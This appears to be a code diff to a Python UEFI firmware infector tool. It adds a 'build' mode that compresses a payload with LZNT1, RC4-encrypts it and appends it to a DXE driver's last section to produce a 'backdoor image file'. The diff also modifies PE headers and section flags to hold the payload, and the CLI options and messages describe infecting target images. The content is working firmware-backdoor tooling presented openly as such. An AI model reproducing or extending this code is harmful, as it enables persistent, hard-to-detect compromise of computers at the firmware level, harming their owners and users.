@@ -124,10 +124,6 @@ def infect(src, dxe_driver, dst = None, payload = None, patch_integrity = False)
                pack(INFECTOR_CONFIG_FMT, *args) + \
                data[offs + INFECTOR_CONFIG_LEN :]
 
-    def _payload_data_set(data, payload_data):
-
-        IMAGE_DOS_HEADER_e_res
-
     # load target image
     pe_src = pefile.PE(src)    
     
@@ -255,7 +251,93 @@ def infect(src, dxe_driver, dst = None, payload = None, patch_integrity = False)
 
     return data
 
-def main():    
+def build(dxe_driver, dst = None, payload = None, patch_integrity = False):
+
+    try:
+
+        import pefile
+
+    except ImportError:
+
+        raise ImportError('pefile is not installed')
+
+    # load DXE driver image
+    pe_dxe = pefile.PE(dxe_driver)
+
+    last_section = None
+    for section in pe_dxe.sections:
+
+        # find last section of target image
+        last_section = section
+
+    if payload is not None:
+
+        try:
+
+            import lznt1
+
+        except ImportError:
+
+            raise ImportError('lznt1 is not installed')
+
+        with open(payload, 'rb') as fd:
+
+            # read payload image data
+            payload_data = fd.read()
+            payload_data_len = len(payload_data)
+
+        print('%d bytes of payload image read' % payload_data_len)
+
+        # compress payload image
+        payload_data = lznt1.compress(payload_data)
+
+        print('%d bytes of payload image after the compression' % len(payload_data))
+
+        # generate payload encryption key
+        key = ''.join([chr(random.randrange(0x01, 0xff)) for i in range(0, PAYLOAD_KEY_LEN)])
+
+        # prepare _PAYLOAD_HEADER structure
+        payload_data = pack('I', payload_data_len) + key + RC4(key).crypt(payload_data)
+
+        # write _BACKDOOR_PAYLOAD structure
+        pe_dxe.DOS_HEADER.e_res = pack('II', os.path.getsize(dxe_driver), len(payload_data))
+
+        section_size = max(last_section.SizeOfRawData, last_section.Misc_VirtualSize) + len(payload_data)
+
+        padding_align = pe_dxe.OPTIONAL_HEADER.SectionAlignment
+        padding_size = padding_align - (section_size % padding_align)
+
+        # fix last section aligntment
+        last_section.SizeOfRawData = section_size + padding_size
+        last_section.Misc_VirtualSize = section_size
+
+        # make it readble and writeable
+        last_section.Characteristics = pefile.SECTION_CHARACTERISTICS['IMAGE_SCN_MEM_READ'] | \
+                                       pefile.SECTION_CHARACTERISTICS['IMAGE_SCN_MEM_WRITE'] | \
+                                       pefile.SECTION_CHARACTERISTICS['IMAGE_SCN_CNT_INITIALIZED_DATA'] | \
+                                       pefile.SECTION_CHARACTERISTICS['IMAGE_SCN_MEM_NOT_PAGED']
+
+        # fix image size
+        pe_dxe.OPTIONAL_HEADER.SizeOfImage = last_section.VirtualAddress + last_section.Misc_VirtualSize
+
+        # get DXE driver image data + payload
+        data = pe_dxe.write() + payload_data + ('\0' * padding_size)
+
+    else:
+
+        # get DXE driver image data
+        data = pe_dxe.write()
+
+    if dst is not None:
+
+        with open(dst, 'wb') as fd:
+
+            # save infected image to the file
+            fd.write(data)
+
+    return data
+
+def main():
 
     option_list = [
 
@@ -270,6 +352,9 @@ def main():
 
         make_option('-o', '--output', dest = 'output', default = None,
             help = 'file path to save infected file'),
+
+        make_option('-b', '--build', dest = 'build', default = False, action = 'store_true',
+            help = 'generate backdoor image file with embedded payload'),
 
         make_option('--patch-integrity-checks', dest = 'patch_integrity', default = False, action = 'store_true',
             help = 'file path to save infected file')
@@ -286,7 +371,7 @@ def main():
             return -1
 
         print('[+] Target image to infect: %s' % options.infect)
-        print('[+] DXE driver: %s' % options.dxe_driver)
+        print('[+] Backdoor DXE driver: %s' % options.dxe_driver)
 
         if options.payload is not None:
 
@@ -319,10 +404,45 @@ def main():
 
         return 0
 
+    elif options.build:
+
+        if options.dxe_driver is None:
+
+            print('ERROR: --dxe-driver must be specified')
+            return -1
+
+        if options.output is None:
+
+            print('ERROR: --output must be specified')
+            return -1
+
+        if options.payload is None:
+
+            print('ERROR: --payload must be specified')
+            return -1
+
+        print('[+] Backdoor DXE driver: %s' % options.dxe_driver)
+        print('[+] Payload image: %s' % options.payload)
+        print('[+] Output file: %s' % options.output)
+
+        try:
+
+            # generate backdoor image file with embedded payload
+            if build(options.dxe_driver, 
+                     dst = options.output, payload = options.payload) is not None:
+
+                print('[+] DONE')
+
+        except Exception, why:
+
+            print('ERROR: %s' % str(why))
+
+        return 0
+
     else:
 
         print('No actions specified, try --help')
-        return -1    
+        return -1
     
 if __name__ == '__main__':
     
